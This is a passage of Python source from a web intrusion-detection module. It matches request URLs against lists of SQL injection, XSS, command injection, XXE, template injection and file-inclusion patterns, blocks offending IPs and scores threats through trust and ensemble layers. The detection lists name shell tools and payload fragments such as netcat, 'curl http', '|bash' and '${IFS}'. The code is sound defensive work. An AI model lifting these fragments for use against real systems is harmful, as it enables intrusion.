            details=f"SQL injection pattern detected | URL: {endpoint_decoded} | Matched patterns: {matched_patterns} | Headers: {dict(headers)}",
            level=ThreatLevel.CRITICAL,
            action="BLOCKED",
            headers=headers
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["SQL injection attack detected and BLOCKED"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Check for directory traversal - BLOCK IMMEDIATELY
    if '../' in endpoint_decoded or '..\\' in endpoint_decoded:
        # BLOCK IP for path traversal attempts
        _block_ip(ip_address)
        _log_threat(
            ip_address=ip_address,
            threat_type="Directory Traversal Attack",
            details=f"Path traversal detected | Full URL: {endpoint_decoded} | Headers: {dict(headers)}",
            level=ThreatLevel.CRITICAL,
            action="BLOCKED",
            headers=headers
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["Directory traversal attack detected and BLOCKED"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Check for XSS patterns (multi-vector attack detection)
    xss_patterns = [
        # Script tags
        '<script', '</script', 'javascript:', 'vbscript:',
        # Event handlers
        'onerror=', 'onload=', 'onclick=', 'onmouseover=', 'onfocus=',
        'onblur=', 'onchange=', 'onsubmit=', 'onkeyup=', 'onkeydown=',
        # HTML injection
        '<iframe', '<embed', '<object', '<applet', '<meta',
        # Data URIs
        'data:text/html', 'data:image/svg',
        # SVG attacks
        '<svg', 'onanimation', 'onbegin=',
        # Base64 obfuscation
        'base64,', 'fromcharcode',
        # Expression injection
        'expression(', 'import(',
        # Template injection
        '{{', '}}', '{%', '%}',
    ]
    if any(pattern in endpoint_lower for pattern in xss_patterns):
        # BLOCK IP for XSS attempts
        _block_ip(ip_address)
        matched_xss = [p for p in xss_patterns if p in endpoint_lower]
        _log_threat(
            ip_address=ip_address,
            threat_type="XSS Attack",
            details=f"XSS pattern detected | Full URL: {endpoint_decoded} | Matched patterns: {matched_xss} | Headers: {dict(headers)}",
            level=ThreatLevel.CRITICAL,
            action="BLOCKED",
            headers=headers
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["XSS attack detected and BLOCKED"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Determine threat level
    if threats:
        assessment = SecurityAssessment(
            level=ThreatLevel.SUSPICIOUS,
            threats=threats,
            should_block=False,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Advanced attack pattern detection (use decoded endpoint)
    
    # Command injection detection (curl in URLs indicates command injection)
    cmd_injection_patterns = [
        'bash', 'sh -c', '/bin/', 'cmd.exe', 'powershell',
        'nc -', 'netcat', 'telnet', 'wget http', 
        # Curl in URLs = command injection attempt
        'curl http', 'curl https', 'curl -', 'curl%20',
        '`cat', '$(cat', '${IFS}',
        # Shell pipe operators in URLs
        '|bash', '|sh', '|/bin', '| bash', '| sh',
    ]
    if any(pattern in endpoint_lower for pattern in cmd_injection_patterns):
        # BLOCK IP for command injection attempts
        _block_ip(ip_address)
        _log_threat(
            ip_address=ip_address,
            threat_type="Command Injection Attack",
            details=f"Command injection pattern detected: {endpoint_decoded[:200]} | Matched: {[p for p in cmd_injection_patterns if p in endpoint_lower][:2]}",
            level=ThreatLevel.CRITICAL,
            action="BLOCKED"
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["Command injection attack detected and BLOCKED"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # LDAP injection - BLOCK IMMEDIATELY
    if any(p in endpoint_decoded for p in ['*)(', ')(', '*)*', '(*)']):
        # BLOCK IP for LDAP injection attempts
        _block_ip(ip_address)
        _log_threat(
            ip_address=ip_address,
            threat_type="LDAP Injection Attack",
            details=f"LDAP injection pattern detected | Full URL: {endpoint_decoded} | Headers: {dict(headers)}",
            level=ThreatLevel.CRITICAL,
            action="BLOCKED",
            headers=headers
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["LDAP injection attack detected and BLOCKED"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # XML injection / XXE - BLOCK IMMEDIATELY
    if any(p in endpoint_lower for p in ['<!entity', '<!doctype', 'system "', 'public "file://']):
        # BLOCK IP for XML/XXE attempts
        _block_ip(ip_address)
        _log_threat(
            ip_address=ip_address,
            threat_type="XML/XXE Injection Attack",
            details=f"XML external entity attack detected | Full URL: {endpoint_decoded} | Headers: {dict(headers)}",
            level=ThreatLevel.CRITICAL,
            action="BLOCKED",
            headers=headers
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["XML/XXE injection attack detected and BLOCKED"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Server-Side Template Injection (SSTI)
    if any(p in endpoint for p in ['{{', '}}', '{%', '%}', '<%', '%>', '${', '${']):
        if any(danger in endpoint_lower for danger in ['eval', 'exec', 'import', 'compile', 'os.', 'subprocess']):
            _log_threat(
                ip_address=ip_address,
                threat_type="Template Injection (SSTI)",
                details=f"Server-side template injection | Full URL: {endpoint_decoded} | Headers: {dict(headers)}",
                level=ThreatLevel.CRITICAL,
                action="blocked",
                headers=headers
            )
            assessment = SecurityAssessment(
                level=ThreatLevel.CRITICAL,
                threats=["Server-Side Template Injection detected"],
                should_block=True,
                ip_address=ip_address,
            )
            return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Local/Remote File Inclusion
    if any(p in endpoint_lower for p in ['file://', 'php://filter', 'php://input', 'expect://', 'data://']):
        _log_threat(
            ip_address=ip_address,
            threat_type="LFI/RFI Attack",
            details=f"File inclusion attempt: {endpoint[:100]}",
            level=ThreatLevel.CRITICAL,
            action="blocked"
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.CRITICAL,
            threats=["Local/Remote file inclusion detected"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # Null byte injection
    if '%00' in endpoint or '\\x00' in endpoint:
        _log_threat(
            ip_address=ip_address,
            threat_type="Null Byte Injection",
            details=f"Null byte attack: {endpoint[:100]}",
            level=ThreatLevel.DANGEROUS,
            action="blocked"
        )
        assessment = SecurityAssessment(
            level=ThreatLevel.DANGEROUS,
            threats=["Null byte injection detected"],
            should_block=True,
            ip_address=ip_address,
        )
        return _finalize_assessment(assessment, actor_key, evidence_events)
    
    # LAYER 19: Causal Inference - Analyze root cause and intent
    if CAUSAL_INFERENCE_AVAILABLE and META_ENGINE_AVAILABLE:
        try:
            # Collect existing signal data for causal analysis
            signal_data = {
                'ip_address': ip_address,
                'endpoint': endpoint,
                'method': method,
                'user_agent': user_agent,
                'headers': headers or {},
                'existing_signals': [s.to_dict() for s in detection_signals],
                'timestamp': datetime.now(timezone.utc).isoformat()
            }
            
            # Analyze causality
            causal_result = analyze_causality(
                entity_id=ip_address,
                event_type='request',
                event_data=signal_data
            )
            
            if causal_result:
                # Add causal inference signal
                is_causal_threat = causal_result.causal_label in [CausalLabel.EXTERNAL_ATTACK, CausalLabel.INSIDER_MISUSE]
                causal_confidence = causal_result.confidence
                
                if causal_confidence >= 0.5:  # Only add meaningful signals
                    sig = DetectionSignal(
                        signal_type=MetaSignalType.CAUSAL_INFERENCE,
                        is_threat=is_causal_threat,
                        confidence=causal_confidence,
                        threat_level=MetaThreatLevel.DANGEROUS if is_causal_threat else MetaThreatLevel.INFO,
                        details=f"Causal analysis: {', '.join(causal_result.primary_causes) if causal_result.primary_causes else 'No clear cause'} (label: {causal_result.causal_label.value})",
                        timestamp=datetime.now(timezone.utc).isoformat(),
                        metadata={
                            'causal_label': causal_result.causal_label.value,
                            'primary_causes': causal_result.primary_causes,
                            'temporal_correlation': causal_result.temporal_correlation,
                            'reasoning': causal_result.reasoning
                        }
                    )
                    detection_signals.append(sig)
                    if is_causal_threat:
                        _record_signal_detection(MetaSignalType.CAUSAL_INFERENCE)
                    evidence_events.append(EvidenceEvent(
                        actor_id=actor_key.id,
                        source_ip=ip_address,
                        behavior_type="causal_inference",
                        signal_type=MetaSignalType.CAUSAL_INFERENCE.name,
                        is_threat=is_causal_threat,
                        confidence=causal_confidence,
                        severity=(MetaThreatLevel.DANGEROUS.value if is_causal_threat else MetaThreatLevel.INFO.value),
                        endpoint=endpoint,
                        method=method,
                        mitre_techniques=[],
                        timestamp=sig.timestamp,
                        raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
                    ))
                    
                    if is_causal_threat:
                        threats.append(f"🔍 CAUSAL: {', '.join(causal_result.primary_causes[:2])} (label: {causal_result.causal_label.value})")
        except Exception as e:
            logger.warning(f"[CAUSAL] Failed to analyze causality: {e}")
    
    # LAYER 20: Trust Degradation - Track entity trust over time
    if TRUST_GRAPH_AVAILABLE and META_ENGINE_AVAILABLE:
        try:
            # Track this entity's behavior
            track_entity(
                entity_id=ip_address,
                event_type='request',
                event_data={
                    'endpoint': endpoint,
                    'method': method,
                    'threat_signals': len([s for s in detection_signals if s.is_threat]),
                    'total_signals': len(detection_signals),
                    'timestamp': datetime.now(timezone.utc).isoformat()
                }
            )
            
            # Get current trust score
            trust_info = get_trust_score(ip_address)
            
            if trust_info:
                trust_score = trust_info.get('trust_score', 60.0)
                step21_trust_score = float(trust_score)
                trust_state_str = trust_info.get('state', 'UNKNOWN')
                # Convert string to TrustState enum if needed
                try:
                    trust_state = TrustState[trust_state_str] if isinstance(trust_state_str, str) else trust_state_str
                except (KeyError, AttributeError):
                    trust_state = trust_state_str  # Use string if enum conversion fails
                
                # Add trust degradation signal
                is_trust_threat = trust_score < 60.0  # Below MONITOR threshold
                trust_confidence = 1.0 - (trust_score / 100.0)  # Low trust = high threat confidence
                
                if trust_score < 80.0:  # Only signal if not fully trusted
                    sig = DetectionSignal(
                        signal_type=MetaSignalType.TRUST_DEGRADATION,
                        is_threat=is_trust_threat,
                        confidence=trust_confidence if is_trust_threat else (trust_score / 100.0),
                        threat_level=MetaThreatLevel.CRITICAL if trust_score < 20.0 else MetaThreatLevel.DANGEROUS,
                        details=f"Trust state: {trust_state_str} (score: {trust_score})",
                        timestamp=datetime.now(timezone.utc).isoformat(),
                        metadata={
                            'trust_score': trust_score,
                            'trust_state': trust_state_str,
                            'total_events': trust_info.get('total_events', 0),
                            'threat_events': trust_info.get('threat_events', 0)
                        }
                    )
                    detection_signals.append(sig)
                    if is_trust_threat:
                        _record_signal_detection(MetaSignalType.TRUST_DEGRADATION)
                    evidence_events.append(EvidenceEvent(
                        actor_id=actor_key.id,
                        source_ip=ip_address,
                        behavior_type="trust_degradation",
                        signal_type=MetaSignalType.TRUST_DEGRADATION.name,
                        is_threat=is_trust_threat,
                        confidence=sig.confidence,
                        severity=(MetaThreatLevel.CRITICAL.value if trust_score < 20.0 else MetaThreatLevel.DANGEROUS.value),
                        endpoint=endpoint,
                        method=method,
                        mitre_techniques=[],
                        timestamp=sig.timestamp,
                        raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
                    ))
                    
                    if is_trust_threat:
                        threats.append(f"⚠️ TRUST: Entity in {trust_state_str} state (score: {trust_score})")
        except Exception as e:
            logger.warning(f"[TRUST-GRAPH] Failed to track trust: {e}")
    
    # PHASE 4: Check for graph-based threats (lateral movement, C2, exfiltration)
    if GRAPH_INTELLIGENCE_AVAILABLE:
        try:
            graph_threats = analyze_lateral_movement()
            
            if graph_threats:
                # Check if this IP is involved in any graph-based threats
                for threat in graph_threats:
                    if threat['source_ip'] == ip_address or ip_address in threat.get('hop_chain', []):
                        threat_desc = f"🕸️ GRAPH THREAT: {threat['threat_type']} - {threat['description']}"
                        threats.append(threat_desc)
                        
                        # PHASE 5: Add graph signal to meta engine
                        if META_ENGINE_AVAILABLE:
                            sig = DetectionSignal(
                                signal_type=MetaSignalType.GRAPH,
                                is_threat=True,
                                confidence=threat.get('confidence', 0.85),
                                threat_level=MetaThreatLevel.CRITICAL if threat['severity'] == 'CRITICAL' else MetaThreatLevel.DANGEROUS,
                                details=threat['description'],
                                timestamp=datetime.now(timezone.utc).isoformat()
                            )
                            detection_signals.append(sig)
                            _record_signal_detection(MetaSignalType.GRAPH)
                            evidence_events.append(EvidenceEvent(
                                actor_id=actor_key.id,
                                source_ip=ip_address,
                                behavior_type="graph_threat",
                                signal_type=MetaSignalType.GRAPH.name,
                                is_threat=True,
                                confidence=sig.confidence,
                                severity=(MetaThreatLevel.CRITICAL.value if threat['severity'] == 'CRITICAL' else MetaThreatLevel.DANGEROUS.value),
                                endpoint=endpoint,
                                method=method,
                                mitre_techniques=[],
                                timestamp=sig.timestamp,
                                raw_signal=sig.to_dict() if hasattr(sig, "to_dict") else None,
                            ))
                        
                        # Log critical graph threats
                        if threat.get('severity') in ['HIGH', 'CRITICAL']:
                            _log_threat(
                                ip_address=ip_address,
                                threat_type=f"Graph Analysis: {threat['threat_type']}",
                                details=threat['description'],
                                level=ThreatLevel.CRITICAL if threat['severity'] == 'CRITICAL' else ThreatLevel.DANGEROUS,
                                action="MONITORED",
                                headers=headers
                            )
        except Exception as e:
            logger.warning(f"[GRAPH] Failed to analyze graph threats: {e}")
    
    # PHASE 5: Use meta decision engine if available (Layers 1–20), then Step 21 semantic gate
    if META_ENGINE_AVAILABLE and detection_signals:
        try:
            ensemble_result = ensemble_decision(detection_signals, ip_address, endpoint)

            # STEP 21: Semantic execution-denial gate (runs after ensemble decision)
            step21_result = None
            step21_verdict = None
            if STEP21_AVAILABLE:
                try:
                    # Default trust score if trust graph not available
                    trust_score_for_gate = step21_trust_score if step21_trust_score is not None else 80.0
                    trust_threshold_for_gate = 40.0  # Below this is considered too risky for execution

                    request_ctx = {
                        "entity_id": ip_address,
                        "entity_role": "network_entity",
                        "action": "network_request",
                        "history": [],  # Network-level, no application lifecycle state yet
                        "payload": {
                            "endpoint": endpoint[:256] if endpoint else "",
                            "method": method or "GET",
                        },
                        "trust_score": trust_score_for_gate,
                        "trust_threshold": trust_threshold_for_gate,
                    }

                    step21_result = step21_evaluate_request(request_ctx)
                    step21_verdict = "ALLOW" if step21_result.get("allow") else "DENY"
                    logger.info(
                        "[STEP21] allow=%s reason=%s policy_version=%s for IP=%s endpoint=%s",
                        step21_result.get("allow"),
                        step21_result.get("reason_code"),
                        step21_result.get("policy_version"),
                        ip_address,
                        endpoint,
                    )
                except Exception as e:
                    logger.warning(f"[STEP21] Semantic gate evaluation failed: {e}")

            # Map meta threat level to pcs_ai threat level
            level_map = {
                MetaThreatLevel.SAFE: ThreatLevel.SAFE,
                MetaThreatLevel.INFO: ThreatLevel.SAFE,
                MetaThreatLevel.SUSPICIOUS: ThreatLevel.SUSPICIOUS,
                MetaThreatLevel.DANGEROUS: ThreatLevel.DANGEROUS,
                MetaThreatLevel.CRITICAL: ThreatLevel.CRITICAL
            }

            # If Step 21 policy gate denies execution, treat as critical and block
            if STEP21_AVAILABLE and isinstance(step21_result, dict) and not step21_result.get("allow", False):
                reason_code = step21_result.get("reason_code") or "step21_denied"
                threats.append(f"🧩 STEP21: Execution denied by policy gate ({reason_code})")

                assessment = SecurityAssessment(
                    level=ThreatLevel.CRITICAL,
                    threats=threats,
                    should_block=True,
                    ip_address=ip_address,
                )
                _record_step21_block()
                return _finalize_assessment(assessment, actor_key, evidence_events)

            # Otherwise, only trust ensemble when confidence is high
            if ensemble_result.confidence >= 0.75:
                logger.info(f"[META-ENGINE] Using ensemble decision (confidence: {ensemble_result.confidence:.2%})")

                assessment = SecurityAssessment(
                    level=level_map.get(ensemble_result.threat_level, ThreatLevel.SUSPICIOUS),
                    threats=ensemble_result.primary_threats if ensemble_result.is_threat else threats,
                    should_block=ensemble_result.should_block,
                    ip_address=ip_address
                )
                return _finalize_assessment(assessment, actor_key, evidence_events)
        except Exception as e:
            logger.warning(f"[META-ENGINE] Ensemble decision failed: {e}")
    
    assessment = SecurityAssessment(
        level=ThreatLevel.SAFE,
        threats=threats if threats else [],  # Include graph threats if any
        should_block=False,
        ip_address=ip_address,
    )
    return _finalize_assessment(assessment, actor_key, evidence_events)


def unblock_ip(ip_address: str) -> bool:
    """Manually unblock an IP address (for admin use).
    
    Returns True if IP was blocked and is now unblocked.
    """
    if ip_address in _blocked_ips:
        _blocked_ips.remove(ip_address)
        _save_blocked_ips()
        # Clear tracking history
        if ip_address in _failed_login_tracker:
            del _failed_login_tracker[ip_address]
        if ip_address in _request_tracker:
            del _request_tracker[ip_address]
        return True
    return False


def add_to_whitelist(ip_address: str) -> bool:
    """Add an IP to the whitelist. Whitelisted IPs cannot be blocked.
    
    Returns True if IP was added, False if already whitelisted.
    """
    if ip_address in _WHITELISTED_IPS:
        return False
    
    _WHITELISTED_IPS.add(ip_address)
    _save_whitelist()
    
    # Also unblock if currently blocked
    if ip_address in _blocked_ips:
        unblock_ip(ip_address)
    
    return True


def remove_from_whitelist(ip_address: str) -> bool:
    """Remove an IP from the whitelist.
    
    Returns True if IP was removed, False if not in whitelist.
    Cannot remove localhost IPs.
    """
    # Protect default localhost IPs
    if ip_address in {"127.0.0.1", "localhost", "::1"}:
        return False
    
    if ip_address in _WHITELISTED_IPS:
        _WHITELISTED_IPS.remove(ip_address)
        _save_whitelist()
        return True
    return False


def get_whitelist() -> list[str]:
    """Get list of whitelisted IP addresses."""
    return list(_WHITELISTED_IPS)


def get_blocked_ips() -> list[str]:
    """Get list of currently blocked IP addresses."""
    return list(_blocked_ips)


def get_whitelisted_ips() -> list[str]:
    """Get list of whitelisted IP addresses."""
    return sorted(list(_WHITELISTED_IPS))


def get_threat_statistics() -> dict:
    """Get comprehensive statistics about detected threats and attacks."""
    # NOTE: Statistics are based on ALL logged threats (including whitelisted IPs)
    # so that training, reporting, and forensic exports remain complete.
    # Count threats by type
    threat_counts = defaultdict(int)
    for log in _threat_log:
        threat_counts[log['threat_type']] += 1
    
    # Count actions
    action_counts = defaultdict(int)
    for log in _threat_log:
        action_counts[log['action']] += 1
    
    # Count severity levels
    severity_counts = defaultdict(int)
    for log in _threat_log:
        severity_counts[log['level']] += 1
    
    # Get unique attacker IPs
    unique_attackers = set(log['ip_address'] for log in _threat_log)
    
    return {
        "blocked_ips_count": len(_blocked_ips),
        "blocked_ips": list(_blocked_ips),
        "tracked_ips_count": len(_failed_login_tracker) + len(_request_tracker),
        "failed_login_attempts": {
            ip: len(attempts) 
            for ip, attempts in _failed_login_tracker.items()
            if attempts
        },
        "total_threats_detected": len(_threat_log),
        "unique_attackers": len(unique_attackers),
        "threats_by_type": dict(threat_counts),
        "actions_taken": dict(action_counts),
        "severity_breakdown": dict(severity_counts),
        "attack_summary": dict(threat_counts),  # For dashboard display
        "recent_threats": _threat_log[-10:] if _threat_log else [],  # Last 10 threats
    }


def assess_header_anomalies(headers: dict, ip_address: str) -> SecurityAssessment:
    """Advanced header analysis for attack detection.
    
    Analyzes HTTP headers for:
    - Missing or suspicious User-Agent
    - Proxy/VPN detection
    - Header injection attempts
    - Protocol violations
    """
    threats = []
    
    # Missing User-Agent (common in automated attacks)
    user_agent = headers.get('user-agent', headers.get('User-Agent', ''))
    if not user_agent:
        threats.append("Missing User-Agent header (automated tool)")
        _log_threat(
            ip_address=ip_address,
            threat_type="Suspicious Headers",
            details="Missing User-Agent - likely automated tool",
            level=ThreatLevel.SUSPICIOUS,
            action="monitored"
        )
    
    # Check for header injection
    for header_name, header_value in headers.items():
        if isinstance(header_value, str):
            if '\\r\\n' in header_value or '\\n' in header_value or '\\r' in header_value:
                _log_threat(
                    ip_address=ip_address,
                    threat_type="Header Injection",
                    details=f"CRLF injection in header {header_name}",
                    level=ThreatLevel.CRITICAL,
                    action="blocked"
                )
                return SecurityAssessment(
                    level=ThreatLevel.CRITICAL,
                    threats=["HTTP header injection detected"],
                    should_block=True,
                    ip_address=ip_address,
                )
    
    # Detect proxy/anonymizer usage (optional - can be enabled)
    proxy_headers = ['x-forwarded-for', 'x-real-ip', 'via', 'forwarded']
    proxy_count = sum(1 for h in proxy_headers if h in {k.lower() for k in headers.keys()})
    if proxy_count >= 2:
        threats.append(f"Multiple proxy headers detected ({proxy_count})")
    
    # ==========================================================================
    # FALSE POSITIVE FILTER - 5-GATE PIPELINE
    # Collect all detection signals and validate through multi-gate system
    # No single signal confirms attack - requires cross-signal agreement
    # ==========================================================================
    
    # Get request count for this IP (needed for FP filter)
    request_count = len(_request_tracker.get(ip_address, []))
    
    if FP_FILTER_AVAILABLE and len(threats) > 0:
        signals = []
        
        # Note: assess_header_anomalies() doesn't have ML analysis results
        # ML signals are only available in assess_request_pattern()
        # So we only collect rule-based and network behavior signals here
        
        # Collect rule-based signals
        if threats:
            # Calculate confidence based on threat severity
            threat_keywords = {'sql injection': 0.95, 'xss': 0.90, 'command injection': 0.98,
                             'ldap': 0.92, 'xxe': 0.95, 'path traversal': 0.85, 
                             'ddos': 0.88, 'brute force': 0.80}
            
            max_confidence = 0.6
            for threat_text in threats:
                for keyword, conf in threat_keywords.items():
                    if keyword in threat_text.lower():
                        max_confidence = max(max_confidence, conf)
            
            signals.append(create_signal(
                signal_type=FPFilterSignalType.RULE_BASED,
                ip_address=ip_address,
                confidence=max_confidence,
                details=f"Rule-based detection: {', '.join(threats[:2])}",
                raw_data={'threats': threats}
            ))
        
        # Add network behavior signal (request rate, patterns)
        if request_count > 200:
            signals.append(create_signal(
                signal_type=FPFilterSignalType.NETWORK_BEHAVIOR,
                ip_address=ip_address,
                confidence=min(request_count / 500, 1.0),
                details=f"High request rate: {request_count} requests/5min",
                raw_data={'request_count': request_count}
            ))
        
        # Run through 5-gate false positive filter
        try:
            fp_assessment = assess_threat(signals)
            
            # Log the false positive filter decision
            print(f"[FP-FILTER] {ip_address} - Confidence: {fp_assessment.total_confidence:.2%} | "
                  f"Gates Passed: {len(fp_assessment.gates_passed)}/5 | "
                  f"Decision: {'CONFIRM' if fp_assessment.should_confirm else 'REJECT'}")
            print(f"[FP-FILTER] Behavior: {fp_assessment.behavior_strength:.2%} | "
                  f"Temporal: {fp_assessment.temporal_strength:.2%} | "
                  f"Cross-Signal: {fp_assessment.cross_signal_agreement:.2%}")
            
            # If false positive filter rejects, downgrade threat level
            if not fp_assessment.should_confirm:
                print(f"[FP-FILTER] ⛔ BLOCKED ATTACK - Rejected by false positive filter: {fp_assessment.reason}")
                print(f"[FP-FILTER] Gates failed: {fp_assessment.gates_failed}")
                
                # Downgrade to SAFE or SUSPICIOUS based on confidence
                if fp_assessment.total_confidence < 0.5:
                    threat_level = ThreatLevel.SAFE
                    threats = [f"⚠️ Potential false positive (confidence: {fp_assessment.total_confidence:.2%})"]
                else:
                    threat_level = ThreatLevel.SUSPICIOUS
                    threats = [f"Suspicious activity (awaiting confirmation - {fp_assessment.reason})"]
                
                # Do NOT block if filter rejects
                return SecurityAssessment(
                    level=threat_level,
                    threats=threats,
                    should_block=False,
                    ip_address=ip_address,
                )
            else:
                print(f"[FP-FILTER] ✅ CONFIRMED ATTACK - Passed all gates: {fp_assessment.reason}")
                print(f"[FP-FILTER] Contributing signals: {[s.value for s in fp_assessment.contributing_signals]}")
                
                # Attack confirmed - proceed with original threat level
                # Add confidence score to threats
                threats.append(f"✅ Confirmed by FP-filter (confidence: {fp_assessment.total_confidence:.2%})")
        
        except Exception as e:
            print(f"[FP-FILTER] Error in false positive filter: {e}")
            # Fall back to original assessment if filter fails
    
    threat_level = ThreatLevel.SUSPICIOUS if threats else ThreatLevel.SAFE
    return SecurityAssessment(
        level=threat_level,
        threats=threats,
        should_block=False,
        ip_address=ip_address,
    )


def is_credential_stuffing(username: str, ip_address: str) -> bool:
    """Detect credential stuffing attacks.
    
    Credential stuffing: attackers try many username/password combinations
    from breached databases across multiple accounts.
    """
    # Track unique usernames per IP
    if not hasattr(is_credential_stuffing, '_username_tracker'):
        is_credential_stuffing._username_tracker = defaultdict(set)
    
    is_credential_stuffing._username_tracker[ip_address].add(username)
    
    # If same IP tries more than 5 different usernames in short time, it's stuffing
    if len(is_credential_stuffing._username_tracker[ip_address]) > 5:
        _log_threat(
            ip_address=ip_address,
            threat_type="Credential Stuffing",
            details=f"Attempted {len(is_credential_stuffing._username_tracker[ip_address])} different usernames",
            level=ThreatLevel.CRITICAL,
            action="blocked"
        )
        _block_ip(ip_address)
        return True
    
    return False


def analyze_request_timing(ip_address: str) -> dict:
    """Analyze request timing patterns to detect automated attacks.
    
    Returns timing analysis with suspicious patterns flagged.
    """
    if ip_address not in _request_tracker:
        return {"status": "normal", "pattern": "insufficient_data"}
    
    requests = _request_tracker[ip_address]
    if len(requests) < 3:
        return {"status": "normal", "pattern": "insufficient_data"}
    
    # Calculate intervals between requests
    intervals = []
    for i in range(1, len(requests)):
        delta = (requests[i] - requests[i-1]).total_seconds()
        intervals.append(delta)
    
    # Perfectly uniform timing = bot
    if intervals:
        avg_interval = sum(intervals) / len(intervals)
        variance = sum((x - avg_interval) ** 2 for x in intervals) / len(intervals)
        
        # Low variance = automated/scripted behavior
        if variance < 0.01 and len(intervals) >= 5:
            _log_threat(
                ip_address=ip_address,
                threat_type="Automated Bot Behavior",
                details=f"Uniform request timing detected (variance: {variance:.4f})",
                level=ThreatLevel.SUSPICIOUS,
                action="monitored"
            )
            return {"status": "suspicious", "pattern": "uniform_timing", "variance": variance}
    
    return {"status": "normal", "pattern": "human_like"}


def get_attack_statistics_detailed() -> dict:
    """Get comprehensive attack statistics for advanced monitoring."""
    stats = get_threat_statistics()
    
    # Add timing analysis
    timing_data = {}
    for ip in _request_tracker:
        timing = analyze_request_timing(ip)
        if timing['status'] == 'suspicious':
            timing_data[ip] = timing
    
    # Top attacking IPs
    ip_threat_count = defaultdict(int)
    for log in _threat_log:
        ip_threat_count[log['ip_address']] += 1
    
    top_attackers = sorted(ip_threat_count.items(), key=lambda x: x[1], reverse=True)[:10]
    
    stats['timing_anomalies'] = timing_data
    stats['top_attacking_ips'] = dict(top_attackers)
    stats['active_threats'] = len([ip for ip in _request_tracker if ip not in _blocked_ips])
    
    return stats


# Configuration constants for tuning
CONFIG = {
    'BRUTE_FORCE_THRESHOLD': 5,  # Failed login attempts before block
    'BRUTE_FORCE_WINDOW_MINUTES': 30,  # Time window for brute force detection
    'DDOS_THRESHOLD': 100,  # Requests before DDoS classification
    'DDOS_WINDOW_MINUTES': 5,  # Time window for DDoS detection
    'RATE_LIMIT_THRESHOLD': 50,  # Requests before rate limiting
    'CREDENTIAL_STUFFING_THRESHOLD': 5,  # Different usernames before blocking
    'AUTO_UNBLOCK_HOURS': 24,  # Hours before automatic IP unblock (0 = never)
}


def update_config(key: str, value: int) -> bool:
    """Update security configuration dynamically."""
    if key in CONFIG:
        CONFIG[key] = value
        return True
    return False


def get_vpn_tor_statistics() -> dict:
    """Get statistics on VPN/Tor/Proxy detection and real IP revelation.
    
    Returns:
        Dictionary with anonymization detection stats for law enforcement.
    """
    vpn_count = 0
    tor_count = 0
    proxy_count = 0
    real_ips_revealed = 0

    # Distinct attacker IPs per anonymization type
    vpn_ips: set[str] = set()
    tor_ips: set[str] = set()
    proxy_ips: set[str] = set()

    # Breakdown of anonymization techniques
    anonymization_breakdown: dict[str, int] = {}
    high_confidence_anonymized = 0

    for log in _threat_log:
        anon_data = log.get('anonymization_detection', {})
        if not anon_data.get('is_anonymized'):
            continue

        anon_type = str(anon_data.get('anonymization_type', '')).lower()
        confidence = int(anon_data.get('confidence', 0) or 0)
        ip = log.get('ip_address')

        # Count by type (attacks)
        if 'tor' in anon_type:
            tor_count += 1
            if ip:
                tor_ips.add(ip)
        elif 'vpn' in anon_type:
            vpn_count += 1
            if ip:
                vpn_ips.add(ip)
        elif 'proxy' in anon_type:
            proxy_count += 1
            if ip:
                proxy_ips.add(ip)

        # Generic anonymization technique breakdown
        if anon_type:
            anonymization_breakdown[anon_type] = anonymization_breakdown.get(anon_type, 0) + 1

        # Track high-confidence anonymized attacks
        if confidence >= 70:
            high_confidence_anonymized += 1

        if anon_data.get('real_ip_revealed'):
            real_ips_revealed += 1

    total_anonymized_attacks = vpn_count + tor_count + proxy_count

    # Read current DNS/TLS metrics to surface cross-layer anonymization behavior
    dns_sources = _load_dns_metrics()
    tls_sources = _load_tls_metrics()

    dns_tunneling_ips = 0
    tls_c2_ips = 0
    timing_anomaly_ips = 0
    vpn_hopping_fingerprints = 0

    # DNS: count IPs with a meaningful fraction of suspicious queries
    if isinstance(dns_sources, dict):
        for ip, stats in dns_sources.items():
            if not isinstance(stats, dict):
                continue
            suspicious = int(stats.get('suspicious_queries', 0) or 0)
            total = int(stats.get('total_queries', 0) or 0)
            if total > 0 and suspicious >= 10 and (suspicious / total) >= 0.2:
                dns_tunneling_ips += 1

    # TLS: count IPs with non-standard TLS ports or very high fan-out
    if isinstance(tls_sources, dict):
        for ip, stats in tls_sources.items():
            if not isinstance(stats, dict):
                continue
            nonstandard_ports = stats.get('nonstandard_tls_ports', []) or []
            unique_dests = int(stats.get('unique_dests', 0) or 0)
            total_flows = int(stats.get('total_flows', 0) or 0)
            has_nonstandard = isinstance(nonstandard_ports, list) and len(nonstandard_ports) > 0
            high_fanout = unique_dests > 50 and total_flows > 200
            if has_nonstandard or high_fanout:
                tls_c2_ips += 1

    # Timing anomalies: reuse analyze_request_timing() over tracked IPs
    for ip in _request_tracker.keys():
        timing = analyze_request_timing(ip)
        if timing.get('status') == 'suspicious':
            timing_anomaly_ips += 1

    # VPN hopping fingerprints: how many fingerprints map to more than one IP
    for fp, info in _fingerprint_tracker.items():
        ips_used = info.get('ips_used')
        if isinstance(ips_used, set) and len(ips_used) > 1:
